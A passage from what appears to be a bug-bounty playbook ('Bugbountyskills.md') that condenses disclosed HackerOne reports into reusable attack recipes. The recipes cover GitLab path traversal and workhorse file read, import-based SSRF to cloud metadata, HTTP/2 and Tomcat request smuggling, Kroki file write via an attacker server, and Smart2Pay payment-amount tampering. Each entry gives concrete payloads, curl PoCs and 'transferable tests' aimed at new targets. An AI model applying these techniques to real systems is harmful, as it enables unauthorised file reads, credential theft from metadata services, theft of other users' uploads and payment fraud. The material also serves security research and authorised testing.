  1. Entry point: `PUT /api/v4/projects/<id>/packages/nuget/` with an ordinary `Private-Token` (any user who can create a project; NuGet registry, EE).
  2. The traversal is NOT in the URL: `metadata_extraction_service.rb` parses the nuspec XML inside the uploaded `.nupkg` (zip) via Nokogiri (`//…/metadata/id`, `//…/metadata/version`), and `update_package_from_metadata_service.rb` interpolates them raw: `def package_filename; "#{package_name.downcase}.#{package_version.downcase}.nupkg"; end`.
  3. Payload: `dummy.nuspec` with `<id>DummyProject.DummyPackage</id>` and `<version>../../../../../nyangawa</version>`, zipped to `dummy.nupkg`, PUT to the endpoint ⇒ the server writes `nyangawa.nupkg` at an attacker-chosen path.
  4. The write yields only a `*.nupkg`; pair it with the Gitaly working-copy race used in #762421/#732330 to turn the arbitrary WRITE into an arbitrary READ (the reporter read `.gitlab_shell_secret`).
  5. Distinguish from §13.5 / #733072 (encoded `../` in the URL PATH → `authorized_keys`) and §17.13 (archive symlink): here the dot-dot lives inside a PARSED FILE whose field becomes a filename — the URL is clean.
DETECTION SIGNAL: an upload whose received file is parsed for a name/value later concatenated into a path (`"#{a}.#{b}.#{ext}"`), especially archives (zip/nupkg/jar/whl/gem) that name the stored object from their interior metadata; registries/packers that rename artifacts from their own metadata; an attacker-writable store whose siblings hold `*.secret`/`*.key`/config.
CHAIN: authenticated user + NuGet registry → upload a `.nupkg` with a `../`-heavy nuspec `<version>` → arbitrary-path write → race the engine's copy/rename of the same tree → arbitrary server file read (High).
TRANSFERABLE TEST: For every "upload a file, the server stores an artifact named from the file's own contents" flow, unzip locally, set the metadata field it reads to `../../../../tmp/nyangawa`, re-zip, upload, then look for the object outside its storage dir; if the server only writes, chain the write with any copy/rename race over the same tree to read it back, and prove with a secret file.

### [Bugbountyskills.md] 17.39 Signed-upload-envelope parser desync: a bracketed multipart field name makes the signed field map and the app's nested-query parse disagree → file location falls back to the unsigned query param → arbitrary file read (GitLab workhorse multipart bypass #850447)

SOURCE: https://hackerone.com/reports/850447 — GitLab 12.9.3-ee, "gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read" (Critical, reporter vakzz)  read 2026-11-07 (body via the HackerOne `.json` endpoint, 6,526 bytes, with the exact `curl` PoCs)
CLASS: trusted-envelope parameter desync → arbitrary server file read · CWE-345 · CWE-22
CORE METHOD:
  1. Setup: workhorse-accelerated uploads (uploads, wiki attachments, NuGet package upload); any authenticated user who can create a project and upload.
  2. Normal flow: workhorse stores the uploaded file and rewrites the request with a SIGNED JSON body listing `rewritten_fields: {"<name>": "<abs tmp path>"}`; Rails trusts that signed map as the file location.
  3. Bypass: send the multipart part with a BRACKETED name — `-F '[package]=@/tmp/lala.txt'` / `-F '[file]=@/tmp/lala.txt'`. Workhorse's map key becomes `"[package]"` while Rails `Rack::Utils.parse_nested_query` returns `{"package" => nil}` — the signature validates, the value is nil, so the handler ignores the payload and reads the location from the QUERY STRING.
  4. Payload: `?package.path=/tmp/ggg` (NuGet) or `?file.path=/tmp/ggg` (wiki). PoC: `curl -XPUT -F '[package]=@/tmp/lala.txt' "http://host/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"` → `201 Created`.
  5. Reach: any file readable by the service user — `allowed_paths` (`FileUploader.root`, uploads storage path, `JobArtifactUploader.workhorse_upload_path`, `public/uploads/tmp`) — and beyond it via `/proc/<pid>/cwd/../../..` and `/proc/<pid>/fd/<n>` (poll in a loop while other users upload to steal their in-flight temp files; the wiki route reads `attrs[:file].read` so it drops the "must be owned by git" restriction).
DETECTION SIGNAL: any accelerated-upload middleware that asserts the file location through a signed/trusted envelope (a `rewritten_fields` map, a signed `X-…-Upload` header, a JSON field→path list) where the SIGNER's key and the CONSUMER's parser normalize the name differently (`[x]`, `x[]`, `a.b`, `%5b`, duplicate names, unicode); an upload handler reading `params[:file][:path]`-style values from the QUERY STRING; upload staging dirs / `/proc/<pid>/fd` holding files mid-processing.
CHAIN: any uploader → bracketed multipart field name → signed map key vs nested-query key mismatch (value nil) → location taken from unsigned `file.path`/`package.path` → arbitrary read inside `allowed_paths` + `/proc/<pid>` traversal → other users' in-flight uploads stolen via `/proc/<pid>/fd` polling → internal file read / cross-user data theft (Critical).
TRANSFERABLE TEST: Capture the trusted envelope your front-end adds to an upload (signed header / `rewritten_fields`). Re-send it with the field name BRACKETED (`[file]`, `[avatar]`, `[package]`) plus `?file.path=/etc/passwd` (or `<field>.path=…`) in the query string; 2xx + the allowlisted/planted file returned as the artifact = signature bypass. Then walk `/proc/<pid>/cwd/..` and poll `/proc/<pid>/fd/<n>` to leave the allowlist.

### [Bugbountyskills.md] 17.40 Import/restore mass-assignment of an uploader's remote-fetch attribute the cleaner forgot → attacker-controlled server-side fetch WITH attacker-chosen headers → SSRF to cloud IMDS / localhost exporters / header-smuggled Redis (GitLab note import #826361)

SOURCE: https://hackerone.com/reports/826361 — GitLab 12.8.7-ee, "SSRF on project import via the remote_attachment_url on a Note" (High, reporter vakzz)  read 2026-11-07 (body via the HackerOne `.json` endpoint, 4,576 bytes, with the carrierwave source paths)
CLASS: import-time mass-assignment → SSRF with arbitrary request headers · CWE-915 · CWE-918
CORE METHOD:
  1. `mount_uploader :attachment, AttachmentUploader` (CarrierWave) makes the model accept the seed attributes `remote_attachment_url=` and `remote_attachment_request_header=` at creation; the project-import `AttributeCleaner` strips only a fixed denylist, so both survive an import.
  2. Repro: project → issue → note → EXPORT project → extract the tar → add `"remote_attachment_url": "http://attacker/"` to the `note` hash in `project.json` → re-compress → IMPORT. Note creation fires the attribute, carrierwave `download!(url, header)` runs `Kernel.open(@uri.to_s, headers)`, the server fetches from inside the network, and the bytes are attached to the note where you can view them.
  3. Amplify: `remote_attachment_request_header` sets ARBITRARY headers — `Metadata-Flavor: Google` for GCP IMDS, auth headers for internal APIs, or a Redis command smuggled in a header (the gitlab-SSRF-Redis path; a POST body is impossible here).
  4. Named reach: Omnibus localhost Prometheus/exporters/Alertmanager (targets at `http://localhost:9090/api/v1/targets`), AWS `169.254.169.254/latest/meta-data/iam/security-credentials/`, GCP `metadata.google.internal`, local/tcp Redis → RCE.
DETECTION SIGNAL: import/restore/seed paths building objects from attacker-editable JSON (project export tar, tenant/GDPR import, backup restore, template repo, CMS import); a model attribute with a remote-FETCH side effect (`remote_<uploader>_url`, `*_url`, `import_url`, `feed_url`, `webhook`) that is present in the interchange file but NOT settable through the normal API/UI; a paired `*_request_header`/`headers` field; a denylist-based attribute cleaner instead of an allowlist.
CHAIN: user who can create+import a project → export, inject `remote_attachment_url` (+ request-header field) into a note, re-import → server-side GET with arbitrary headers from the internal network → IMDS credentials / localhost exporters / header-smuggled Redis → internal access and, in the Redis case, RCE (High).
TRANSFERABLE TEST: Diff every key of an object/tenant export against the fields the normal API accepts; re-import it with an added `remote_*_url` pointing at your listener — a callback proves the server-side fetch. Then add the paired header field and point it at `169.254.169.254`, `metadata.google.internal`, `http://localhost:9090/api/v1/targets` and `localhost:6379` to measure the real reach.

### [Bugbountyskills.md] 17.56 HTTP/2 → HTTP/1.1 frontend-downgrade request smuggling: a framing header the frontend never parses but the backend does (Basecamp #1211724 / neex `http2smugl`)

SOURCE: https://hackerone.com/reports/1211724 — Basecamp, "HTTP Request Smuggling via HTTP/2" (HTTP Request Smuggling; Critical; $7,500; 298 upvotes; reporter neex; asset app.basecamp.com)  read 2026-11-07 (report body `visibility: no-content` on every route — `.json` has `vulnerability_information` null and a title-only summary id 84816; the disclosed-reports mirror says "No vulnerability information available."; Wayback only yields the SPA shell / a gzip-mangled body / an archive.org rate-limit page. Recorded from the reporter's OWN credited public artifact for this research: `github.com/neex/http2smugl` README, 13,765 bytes, fully readable.)
CLASS: HTTP/2 → HTTP/1.1 frontend-downgrade request smuggling (H2.CL / H2.TE) · CWE-444
CORE METHOD:
  1. Precondition: the frontend terminates HTTP/2 and converts each request to HTTP/1.1 for the backend, and that hop is keep-alive — so the frontend multiplexes OTHER users' requests onto the connection you are poisoning.
  2. Smuggle ONE framing header (`Content-Length` or `Transfer-Encoding`) so it survives H2→H1.1 conversion but is not interpreted by the frontend. Rearrange the header NAME: append whitespace (` `, `\t`, `\v`, `\x00`, Unicode spaces → `transfer-encoding `), or replace `-` with `_` for CGI-style backends whose map is `HEADER_NAME` (`transfer_encoding: chunked`, so such a backend looks up `TRANSFER_ENCODING` anyway). The frontend ignores/tolerates the mangled name, passes it through, the backend trims it back.
  3. HTTP/2-only variants (RFC7540 §10.3 merely asks converters to *consider* the H1 charset limits, so many reject nothing): (a) a NEWLINE inside the name or value — `fake: fake\r\ntransfer-encoding: chunked` becomes TWO headers after conversion; (b) UTF-8 case-fold confusables — `\u017f` (ſ) uppercases to `S` (`TRANSFER-ENCODING` with ſ) and `\u212a` (KELVIN SIGN) lowercases to `k` (`chunKed` written with Kelvin becomes `chunked`).
  4. No payload is needed for the signal (step 1 of the test below). Documented false-positive stacks to exclude first: Amazon ELB (won't reuse a connection after a "suspicious" header → no real attack; identify via `content__length: -1` → 400), Apache Traffic Server (converts H2→H1.1 in memory and re-parses → not exploitable; identify with `TRACE` + `Max-Forwards: 0`), Microsoft IIS (decodes chunked inside H2 bodies → innocent; identify via `transfer-encoding:chunked` + malformed chunk body → `Server: Microsoft-HTTPAPI`), and generic WAFs (differential blocking = false positive).
DETECTION SIGNAL: an edge/LB/CDN that terminates H2 and downconverts to H1.1 upstream (Cloudflare, nginx→upstream, Envoy, custom Go/Java frontends, most WAFs), especially when the origin behind it is a different, older H1.1 parser; a keep-alive frontend↔backend hop; per-request frontend rewrites/protections a smuggled prefix would bypass.
CHAIN: poison the frontend↔backend keep-alive connection with a partial smuggled request → the frontend appends the NEXT request (another user's) into your body → (a) retrieve another user's request (data/PII theft), (b) bypass frontend protections and URL rewrites, (c) cache poisoning / cache deception at the edge → up to mass account impact (smuggling is a zero-click primitive when the prefix is attached to a victim's request).
TRANSFERABLE TEST: over HTTP/2 send a smuggled framing header with two bodies and compare. Variant 1 (most reliable): `transfer_encoding: chunked` with body `0\r\n\r\n` vs `999\r\n` — if the invalid one HANGS and the valid one answers, the BACKEND parsed your smuggled header (H2 has no reason to use H1 chunk lengths). Variant 2: same header, `0\r\n\r\n` vs `X\r\n\r\n`. Variant 3 (least reliable): `content_length: 1` vs `content_length: -1`, no body either time. Separable = disjoint status-code sets OR separable length sets; treat a timeout as a distinct status value. Tooling: `go install github.com/neex/http2smugl@latest`; `http2smugl detect https://target` (prints only when the server parses a smuggled header) and `http2smugl request https://target 'name\x3awith\x3acolons:value'` to emit malformed/binary names normal clients refuse to send.

### [Bugbountyskills.md] 17.59 Delimiter-less signature canonicalization → signed-payment parameter smuggling (`Amount=2000` ≡ `Amount2=000`) → attacker-set amount → monetary generation (Valve / Smart2Pay #1295844)

SOURCE: https://hackerone.com/reports/1295844 — Valve, "Modify in-flight data to payment provider Smart2Pay" (Business Logic Errors; Critical; reporter drbrix)  read 2026-11-07 (full body via the HackerOne `.json` endpoint, 3,901 bytes — both raw requests verbatim)
CLASS: signature-canonicalization ambiguity — the HMAC covers a DELIMITER-LESS concatenation of parameter names+values, so shifting the name/value boundaries yields a different parsed request with an identical signed string · CWE-345 / CWE-20 → monetary impact
CORE METHOD:
  1. Entry: the store hands the browser a form POST to the payment provider — `POST / HTTP/1.1  Host: globalapi.smart2pay.com`, `application/x-www-form-urlencoded`, body `MerchantID=1102&MerchantTransactionID=…&Amount=2000&Currency=PLN&ReturnURL=…&MethodID=12&Country=PL&CustomerEmail=…&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=…`.
  2. The scheme (the crux): `Hash` = `hash(ALL_FIELD_NAMES_AND_VALUES_CONCATENATED)` — no delimiters, no length prefix → `hash(MerchantID1102MerchantTransactionID…Amount2000…)`. The signed string is ambiguous about field boundaries.
  3. Field-rename primitive: `Amount=2000` and `Amount2=000` concatenate to the same `Amount2000` → rename a parameter while `Hash` still validates.
  4. Boundary-shift primitive: pre-set a field you control so the signature can be re-split. With `CustomerEmail=brixamount100abc@host` the signed string contains `CustomerEmail`+`brixamount100abc@host`; re-sending `CustomerEmail=brix&amount=100&ab=c@host` concatenates to the identical string, so the provider recomputes the same Hash while parsing THREE fields, including a NEW `amount=100`.
  5. Result: the tampered request is accepted as validly signed — the attacker pays ~$1 while the flow credits the wallet with an attacker-chosen balance (server-side transaction ids included as evidence).
DETECTION SIGNAL: any HMAC over concatenated parameters with no separator, no length prefix and no canonical ordering — in payment hand-offs, redirect-form signatures, webhook signatures, "signed" checkout links; aggravated when a signed field is attacker-controlled and can carry `&`/`=` (email, name, description) and the server parses the same body it verified.
CHAIN: register a value in a signed field (email `brixamount100abc@host`) → re-send the SAME signed request with shifted boundaries (`Amount=2000` → `Amount2=000`; `CustomerEmail=brix&amount=100&ab=c@host`) → identical recomputed hash → the provider honours attacker-injected fields → monetary generation / free credit / discounted purchase at scale (Critical).
TRANSFERABLE TEST: from ONE legitimately signed request, reimplement the canonicalization locally as `concat(name+value)` without separators and test that the server accepts both (a) a field rename that preserves the concatenation (`Amount=2000` → `Amount2=000`, or `a=xy` → `ab=y`) and (b) a parameter injected INSIDE an existing value (`&newparam=value&`) that concatenates back to the original. If both verify and the injected parameter is honoured downstream, escalate to the money field (amount, price, quantity, currency, recipient).

### [Bugbountyskills.md] 17.70 Flag injection that switches the tool into its own filesystem-walk mode (`ref=--no-index` into `git grep`) → internal file read → tokens (GitLab Search API #682442) — read-side variant of the §13.8-5 flag-injection lineage

SOURCE: https://hackerone.com/reports/682442 — GitLab, "Git flag injection - Search API with scope 'blobs'" (CVE-2019-15575; argument injection; High; $7,000; reporter will)  read 2026-11-07 (full body, 2,712 bytes, via the HackerOne `.json` endpoint; split out of #658013 whose `wiki_blobs` scope was fixed in 12.1.6 while `blobs` was missed)
CLASS: argument/flag injection into a VCS CLI → internal file read · CWE-88 → CWE-538 / CWE-200. §13.8-5 / #587854 WRITE via `--output=`; this one READS — the payload IS the mode flag, no dash-in-a-name, no shell.
CORE METHOD:
  1. `GET /api/v4/projects/<id>/search?scope=blobs&search=<term>&ref=<revision>` with `PRIVATE-TOKEN`.
  2. `ref=--no-index`, `search=.` → the response contains files that are not in the repository (`VERSION`, `config.toml`), interleaved as `<filename>\u0000<lineno>\u0000<text>`.
  3. Reconstructed argv (reporter): `git --git-dir … grep --ignore-case -I --line-number --null --before-context 2 --after-context 2 --perl-regexp -e a --no-index` — the `ref` value is a bare argv element, so `--no-index` makes git grep walk the CWD (`/var/opt/gitlab/gitaly`) and untracked files.
  4. Result: `config.toml` with the Gitaly token and the Sentry DSNs → credentials for lateral movement.
DETECTION SIGNAL: a branch/tag/revision/commit/ref/path parameter reaching a VCS/CLI tool; the server ACCEPTS a value starting with `-` (`ref=--help` → usage banner or a tool error quoting your flag); search/grep/archive/diff/export features on top of `git grep`/`git log`/`git archive`/`tar`/`zip`/`7z`; hits for files that cannot exist in the repo (root configs, `/etc` paths, version files).
CHAIN: any user able to read one project → `ref=--no-index` + broad search → `git grep` searches the service's working directory instead of the repository → arbitrary readable file returned → tokens/DSNs harvested → lateral movement to internal services → infrastructure compromise (High).
TRANSFERABLE TEST: for every revision/path parameter send `--help`, then a mode-switching flag per tool (`--no-index` for git grep, `--output=/tmp/<marker>` for git archive, `--files-from=/etc/hostname`/`-T/etc/hostname` for tar) and look for a changed body (out-of-repo filenames) or an error quoting your flag; then set the search term to `.` and enumerate.

### [Bugbountyskills.md] 17.73 URL-preview / unfurl endpoint returns the fetched page's `og:title` → a built-in blind-SSRF READ ORACLE + port scan (Reddit Matrix `preview_url` #1960765)

SOURCE: https://hackerone.com/reports/1960765 — Reddit, "Blind SSRF to internal services in matrix preview_link API" (SSRF; High CVSS 7.5; $6,000; reporter la_revoltage)  read 2026-11-07 (full body, 1,168 bytes, via the HackerOne `.json` endpoint; internal targets redacted, method intact)
CLASS: blind SSRF in a URL-preview endpoint that echoes page metadata → read oracle · CWE-918
CORE METHOD:
  1. `GET https://<matrix-host>/_matrix/media/r0/preview_url/?url=<target>` — the URL is fetched server-side with NO filtering.
  2. Put an INTERNAL URL in `url`; the JSON response returns the fetched page's `og:title` → you read the TITLE of internal pages the server can reach.
  3. `url=http://<internal-ip>:<port>/` and repeat — a live service returns an `og:title`, a dead one hangs (~2 s, reload until it responds) → host/port enumeration.
  4. The reporter held the escalation (internal URL reachable → "may be possible to run" further actions) pending permission → Critical.
DETECTION SIGNAL: any server-side URL fetch feature (link/image preview, unfurl, import-from-URL, avatar-from-URL, webhook tester, RSS reader, PDF/screenshot renderer) whose response echoes `og:title`/`og:description` → read oracle; internal/loopback/metadata ranges not blocked; timing differences on open vs closed ports.
CHAIN: low/no-priv request to the preview endpoint with an internal URL → `og:title` discloses internal titles → enumerate services/ports → target an internal-only service from the fetcher → RCE/critical (hold as a lead until proven).
TRANSFERABLE TEST: submit `url=http://127.0.0.1:<port>/`, `url=http://169.254.169.254/latest/meta-data/` and an RFC1918 host; if the response carries `og:title`/meta or its length/timing differs from a closed port you have the oracle — then sweep by timing and returned title, and try `gopher://`, `file://`, `dict://`, and a `302 → internal` redirect to defeat naive allowlists.

### [Bugbountyskills.md] 17.77 CRLF injection through an edge/WAF rule-engine string function accepting HEX ESCAPES (`\x0a\x0d` in `concat()`) -> header injection -> TE.CL smuggling -> security-layer (Cloudflare Access) bypass (Cloudflare #1478633)

SOURCE: https://hackerone.com/reports/1478633 — Cloudflare, "HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in the concat() function" (HTTP Request Smuggling; Critical; $6,000 + quality bonus; reporter albertspedersen)  read 2026-11-07 (no-content: researcher body not public — technique read from the PUBLIC CLOUDFLARE TEAM SUMMARY on the report page via `web_extract`)
CLASS: hex-escape CRLF injection in an edge rule engine -> HTTP request smuggling (TE.CL) -> WAF/access-control bypass · CWE-444 + CWE-93 · "the WAF is a parser too"
CORE METHOD:
  1. Cloudflare Transform Rules' string functions `concat()`/`lower()` accepted hexadecimal-encoded characters such as `\x0a\x0d` (LF/CR) in a value that lands in an OUTGOING request header.
  2. Composing a header value via `concat(...)` with an embedded `\x0a\x0d` injects an ADDITIONAL header (CRLF) on the edge->origin leg.
  3. The injected CRLF desyncs the front-end and the origin -> TE.CL request smuggling -> Cloudflare Access bypassed -> internal origin content read; mitigation guidance was to verify the Authorization JWT at the origin.
DETECTION SIGNAL: any WAF/CDN/edge that composes header values or rewrites from user input via a rule/expression engine (Cloudflare Transform/Origin Rules, AWS WAF, Akamai, Fastly VCL, Envoy/nginx `map`+`set`); test whether CR/LF survives as `\x0a\x0d`, `\r\n`, `%0a%0d`, `\u000a`, `\x0d\x0a`; whether the composed value reaches an outgoing header; whether a second `Transfer-Encoding`/`Content-Length` can be introduced.
CHAIN: user-controlled value -> rule-engine `concat()`/`lower()` with a hex escape -> CRLF in an outgoing header -> TE.CL desync -> auth/edge layer (Cloudflare Access) bypassed -> internal origin content read (Critical).
TRANSFERABLE TEST: on an edge that composes a header/rewrite from input, feed `\x0a\x0d`, `%0d%0a`, `\r\n` into the value feeding `concat()`/`lower()`/rewrite; send a CL.TE/TE.CL payload smuggling a request for a PROTECTED path and check whether internal content is returned or the NEXT request is affected (marker capture) — a smuggled header arriving at the origin proves CRLF injection.

### [Bugbountyskills.md] 17.79 Security-disabled feature attribute RE-ENABLED from document CONTENT via an inline counter/set macro -> arbitrary file read + arbitrary file write (GitLab Kroki #1098793)

SOURCE: https://hackerone.com/reports/1098793 — GitLab, "Kroki Arbitrary File Read/Write" (Improper Access Control - Generic; High; reporter ledz1996; patched in GitLab 13.10.1)  read 2026-11-07 (full body, 8,355 bytes, from the public disclosed-reports dataset `cgyzfjm/hackerone_disclosed_reports` and re-verified via `r.jina.ai`)
CLASS: local file read + arbitrary file write via a diagram-renderer include/fetch path, by re-enabling from CONTENT a config attribute the app had explicitly disabled · CWE-22/CWE-26 — "the feature we disabled is still settable from inside the document"
CORE METHOD:
  1. GitLab's AsciiDoc integration disables the dangerous Kroki/PlantUML attributes by UNSETTING them: `'kroki-plantuml-include!' => ''`, `'kroki-fetch-diagram!' => ''` (the `!` unsets), because they "rely on `File#read` to read the file" / on the local filesystem.
  2. Bypass: Asciidoctor's inline `{counter:<attr>:<seed>}` macro SETS an attribute (`@attributes[name] = @counters[name] = seed`) from document content — it recreates the unset attribute and nothing re-checks the disable.
  3. FILE READ: `[plantuml, test="{counter:kroki-plantuml-include:/etc/passwd}", format="png"]` + a PlantUML block referencing `{counter:kroki-plantuml-include}` -> the include reads the file into the diagram source -> Kroki returns the source base64+DEFLATE inside the image URL -> `Zlib::Inflate.inflate(Base64.urlsafe_decode64(url_last_part))`.
  4. FILE WRITE (two-pass): `[plantuml, test="{counter:kroki-fetch-diagram:true}", tet="{counter:kroki-server-url:http://ATTACKER:8082/}", format="/../../../../../../tmp/pwn.txt"]` with `:imagesdir: diag-<sha>.` / `:outdir: /tmp/` — pass 1 teaches you the `diag-<sha256>.` basename from the image URL, pass 2 makes GitLab FETCH the diagram from your server and write it to a path built from `imagesdir` + `format`, where `../` traversal escapes the directory.
DETECTION SIGNAL: an app whose config DISABLES a dangerous include/fetch attribute (grep for `attr!`, "relies on File#read", "local file system"); a renderer with inline substitution at render time (`{counter:}`, `{set:}`, `${…}`, `#{…}`, `{{…}}`) — that is the re-enable primitive; a diagram/PDF renderer echoing its input source base64/zlib-encoded inside the artifact URL (read oracle); settings `kroki-server-url`/`plantuml-server-url`/`imagesdir`/`outdir`.
CHAIN: attacker document (any user who can create an asciidoctor wiki page/issue) -> `{counter:...}` SETS a security-disabled attribute -> local file read (secrets) + attacker-server-driven artifact fetch -> `format` path traversal writes to an arbitrary path -> overwrite a served/trusted file -> RCE.
TRANSFERABLE TEST: take the class "feature we disabled for security" and set it from CONTENT, not config. On any AsciiDoc/diagram wiki: (a) `[plantuml, test="{counter:kroki-plantuml-include:/etc/passwd}", format="png"]` + a block referencing the counter, then base64+zlib-decode the image URL; (b) aim the diagram-server setting at your host with the same trick, set `:outdir:`/`:imagesdir:`, put `../` traversal in `format=` and confirm the artifact is written outside the intended directory. The vendor patch note names the attribute that was unset — that attribute is the target.

### [Bugbountyskills.md] 17.93 A document-IMPORT pipeline fetches a reference found inside the uploaded archive and returns the response BODY as a downloadable artefact — full-read SSRF, filter bypassed by DNS rebinding to cloud metadata (Lark Docs `import as docs` #1409727)

SOURCE: https://hackerone.com/reports/1409727 — Lark Technologies, "Full read SSRF via Lark Docs `import as docs` feature" (SSRF; Critical 9.6; $5,000; asset `larksuite.com`; published 2022-01-28)  read 2026-11-07 (H1 body `no-content`/unreachable on every direct route; ROUTE THAT WORKED = route 5, the reporter's credited writeup "Bypassing SSRF Protection to Exfiltrate AWS Metadata from LarkSuite", https://sirleeroyjenkins.medium.com/bypassing-ssrf-protection-to-exfiltrate-aws-metadata-from-larksuite-bf99a3599462, read in full via `web_extract`)
CLASS: full-read SSRF via a server-side document-import pipeline (+DNS-rebind filter bypass)
CORE METHOD:
  1. Entry point: an "Import from docs" feature (Lark Wiki; accepts Confluence ZIP / Office / CSV). A Confluence export ZIP holds one HTML file per page with images/attachments referenced by a PATH (`<img src="...">`).
  2. Replace that reference with an attacker URL, repackage the ZIP, import it: the server fetches the URL (Collaborator callback) and the generated Wiki page contains a DOWNLOADABLE ATTACHMENT whose contents are the fetched response body -> FULL-READ (not blind) SSRF.
  3. `169.254.169.254` and internal hostnames are blocked; a 302 redirect to the metadata URL is followed but does NOT bypass the filter.
  4. BYPASS = DNS rebinding: point the reference at a TTL-0 hostname alternating a public IP and `169.254.169.254` (e.g. `8efb23ae.a9fea9fe.rbndr.us`); the filter validates a "safe" IP and the fetch connects to the internal IP (~10 import attempts because of the alternation).
  5. Escalate: rebind to `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance` -> the attachment contains the EC2 instance's AWS credentials.
DETECTION SIGNAL: any import/convert/preview feature that fetches a file's INTERNAL REFERENCES server-side (image `src`, attachment `href`, XML external entities) and returns the fetched body as a rendered/stored artefact; a blocklist that resolves a hostname only once (resolve-then-fetch TOCTOU).
CHAIN: importer -> rewrite an in-archive asset reference to an attacker URL -> server fetches it -> response body returned as an attachment (full read) -> DNS-rebind past the internal-IP filter -> cloud metadata -> EC2 credentials -> account compromise.
TRANSFERABLE TEST: upload an archive whose internal reference points at your Collaborator; confirm the callback AND that the response body comes back as an artefact; then aim at `169.254.169.254`/internal hosts; when blocked, re-point at a TTL-0 rebinding hostname and repeat imports. Try the same against Docx/Excel/SVG/PDF/Sitemap importers; the generalisation is "document-import pipeline = SSRF sink, and a response returned as a file = proven full read".

### [Bugbountyskills.md] 17.105 A customer-created PROVISIONING object supplies the URL, and the provider's CONTROL-PLANE controller fetches it from the provider's network — half-blind SSRF, upgraded by a `#`-truncated path, a 302 POST->GET conversion and CRLF smuggling (Kubernetes #776017)

SOURCE: https://hackerone.com/reports/776017 — Kubernetes, "Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service" (SSRF; bounty; reporters reeverzax + hach; created 2020-01-15; disclosed 2020-10-30)  read 2026-11-07 (route: full 12,009-B reporter body from the LOCAL dataset mirror `/tmp/h1_train.parquet`, `visibility: full`)
CLASS: SSRF in a managed platform's control plane (multi-tenant privilege boundary crossed by a data parameter, not by a bug in the web app)
CORE METHOD:
  1. Create the provisioning object a tenant is allowed to create — a StorageClass whose provisioner takes a URL (glusterfs `resturl`; the report also names scaleio, storageos) — plus the PVC that triggers provisioning; the request is issued by the kube/cloud-controller-manager INSIDE the provider's perimeter.
  2. Defeat the path the client appends (`/volumes`): `resturl: "http://attacker:6666/#"` — the `#` makes the appended path a fragment that never leaves the client, so the path is fully attacker-controlled.
  3. Read the answer although the SSRF is half-blind: `kubectl describe pvc <x>` and `kubectl get events` echo response content, and where the managed plan exposes kube-controller-manager logs to the customer the full body is readable.
  4. Convert POST to GET by redirecting: `resturl: "http://attacker/redirect.php#"` -> your server answers 302 `Location: http://169.254.169.254/…`; the Go `net/http` client follows the redirect and (for 302) switches the method to GET, so internal GETs are possible on demand.
  5. Go < 1.12 clients (k8s <= v1.15.3 / v1.14.6 / v1.13.10 by the report; golang/go#30794) allow CRLF smuggling inside the URL parameter — the whole request can be crafted: `http://172.31.X.1:10255/healthz? HTTP/1.1\r\nConnection: keep-alive\r\nHost: …\r\nContent-Length: 1\r\n\r\n1\r\nGET /pods? HTTP/1.1\r\nHost: …\r\n\r\n`, with the internal response leaking into the controller logs.
  6. Automate per (ip, port) as delete-SC / delete-PVC / create-SC / create-PVC, 15 parallel workers over the provider's internal range; post-exploitation the researchers list metadata-API credentials -> "Remote command execution by using these credentials", LAN enumeration, cross-customer data, unencrypted ETCD 2379, master DoS.
DETECTION SIGNAL: any customer-creatable resource whose schema holds a URL/host/endpoint that a controller, worker or provisioner consumes (StorageClass/CSI parameters, backup or restore targets, connectors/integrations, webhook registrations, log sinks, mirror/import URLs); an inbound request at your collaborator arriving from the PROVIDER's network rather than your own egress; provisioning events echoing remote content; a client that appends a fixed path to your URL (probe with `#`); managed plans that expose controller/operator logs to tenants.
CHAIN: tenant with "create StorageClass + PVC" -> provider-side controller fetches the URL from the class parameters -> half-blind SSRF with events/log readback -> 302 turns POST into GET -> (old Go) CRLF smuggling = attacker-crafted internal HTTP + response readback -> cloud metadata credentials -> lateral movement and code execution with those credentials (critical scope).
TRANSFERABLE TEST: in any managed service, point the endpoint-bearing resource at your collaborator and confirm the request comes from the PLATFORM's network; then append `#` to kill the appended path, redirect (302) to `http://169.254.169.254/…` to convert the method and reach metadata, and inject CRLF into the URL to smuggle headers/a second request, reading the answer back through the controller's own error/log channel.
WHY IT IS A NEW GENERAL METHOD: recorded SSRF entries are web-app fetchers (webhook test button §2.3, import-from-URL, unfurl). This one makes the platform's CONTROL PLANE the fetcher, with the tenant crossing a trust boundary by declaring infrastructure — and the `#`/302/CRLF trio is what turns a half-blind POST-only SSRF into full read + full control.

### [Bugbountyskills.md] 17.110 Oversized chunked-TRAILER header drives a back-end parser into an `IOException` error path → the leftover bytes are re-framed as a NEW request → request smuggling (Apache Tomcat 9.0.82 / HackerOne #2280391)

SOURCE: https://hackerone.com/reports/2280391 — Internet Bug Bounty, "Possibility of Request smuggling attack", HTTP Request Smuggling, asset github.com/apache/tomcat, reporter aimotonorihito, submitted 2023-12-11, disclosed 2023-12-22, 90 votes  read 2026-11-07 (route: full `visibility: full` body, 1,629 B, from the LOCAL dataset mirror `/tmp/h1_train.parquet`; live page Cloudflare-blocked)
CLASS: HTTP request smuggling via a parser ERROR PATH at a size boundary (CWE-444)
CORE METHOD:
  1. Send a chunked POST whose TRAILER section has one header line exceeding the header-size limit (~8190 B): `POST /examples/test.jsp … Transfer-Encoding: chunked …` + body `5\r\nfoo=b\r\n2\r\nar\r\n0\r\ntesttrailer: aaaa…(8190)\r\na: GET /examples/?this_is_attack HTTP/1.1\r\nHost: attack`.
  2. The trailer overflows "the upper size limit of the trailer header" → Tomcat throws an `IOException`; the bytes after it (`a: GET /examples/?…`) are parsed as a second request.
  3. PoC: `8190_EXCLUDE_COLON_SP_CR_LF.txt` (`testtrailer: ` + 8179×`a` + CRLF) appended to `head -11 base.txt`, then `a: GET /examples/?…\r\n\r\n`; `cat attack5.txt | curl telnet://localhost:8082/`.
  4. Result: two HTTP responses and TWO back-end access-log lines from ONE front-end request.
DETECTION SIGNAL: an origin behind a reverse proxy whose parser has a header/TRAILER size limit and does not close the connection after the limit error; chunked trailers supported; front-end request count ≠ back-end access-log count.
